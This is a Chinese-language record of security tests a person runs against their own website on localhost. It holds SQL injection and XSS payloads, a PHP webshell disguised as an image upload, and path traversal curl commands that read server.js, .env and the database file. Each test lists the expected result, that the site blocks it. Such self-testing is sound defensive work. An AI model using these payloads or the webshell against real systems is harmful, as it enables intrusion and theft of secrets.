# 個人網站攻擊測試紀錄

## 1. SQL Injection

**目標**：竊取資料庫內容

在登入頁面的帳號欄輸入：
```
' OR '1'='1' --
```
```
' UNION SELECT id, username, password_hash, avatar_path FROM users--
```

在 Terminal 直接打：
```bash
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' OR 1=1--","password":"x"}'
```

**預期**：回傳 `Invalid username or password` → 有防護 ✓

---

## 2. XSS

**目標**：讓別人的瀏覽器執行你的 JS

先註冊帳號，然後在留言板依序送出：
```
<script>alert(document.cookie)</script>
```
```
<img src=x onerror="document.body.style.background='red'">
```
```
<svg onload="alert('XSS')">
```

**預期**：顯示純文字，不執行 → 有防護 ✓

---

## 3. 上傳 Webshell

**目標**：取得後端控制權

**步驟 1**：建立偽裝成圖片的惡意檔案
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
cp /tmp/shell.php /tmp/shell.jpg
```

**步驟 2**：上傳這個 `shell.jpg` 當頭貼

**步驟 3**：如果上傳成功，嘗試執行：
```bash
curl "http://localhost:3000/uploads/[上傳後的檔名]?cmd=id"
```

**預期**：上傳被拒絕（magic bytes 不符）→ 有防護 ✓

---

## 4. 取得後端檔案（Path Traversal）

**目標**：讀取 server.js、.env 等檔案

```bash
curl "http://localhost:3000/uploads/../../server.js"
curl "http://localhost:3000/uploads/../../.env"
curl "http://localhost:3000/uploads/../../database.sqlite"
```

**預期**：回傳 `Invalid filename` → 有防護 ✓
